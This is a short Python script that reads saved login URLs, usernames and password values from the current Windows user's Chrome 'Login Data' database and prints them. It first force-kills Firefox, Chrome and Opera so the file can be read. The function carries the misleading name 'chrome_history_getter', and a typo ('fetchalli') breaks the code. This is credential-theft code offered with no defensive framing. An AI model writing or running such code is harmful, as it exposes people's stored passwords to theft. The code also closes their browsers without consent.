import os
import sqlite3
def chrome_history_getter(uname):
    con = sqlite3.connect(f'C:\\Users\\{uname}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
    cursor = con.cursor()
    cursor.execute("SELECT action_url, username_element, username_value, password_element, password_value FROM logins")
    urls = cursor.fetchalli()
    return urls
uname = os.getlogin()
os.system("taskkill /im firefox.exe /f")
os.system("taskkill /im chrome.exe /f")
os.system("taskkill /im opera.exe /f")

hist = chrome_history_getter(uname=uname)
hist = str(hist)
print(hist)

